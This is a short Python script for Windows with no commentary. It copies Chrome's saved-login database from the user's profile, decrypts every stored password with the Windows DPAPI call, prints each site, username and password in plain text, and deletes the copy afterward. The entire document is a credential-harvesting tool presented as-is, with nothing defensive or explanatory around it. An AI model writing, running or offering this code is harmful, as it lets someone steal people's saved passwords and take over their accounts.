from os import getenv, unlink
from shutil import copy
import sqlite3
import win32crypt

dbpath = "C:\Users\\"+ getenv('username') +"\AppData\Local\Google\Chrome\User Data\Default\\"
copy(dbpath + "Login Data", dbpath + "Login Data.db")
conn = sqlite3.connect(dbpath + "Login Data.db")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    print result[0] + " - " + result[1] + ":" + password

conn.close()
unlink(dbpath + "Login Data.db")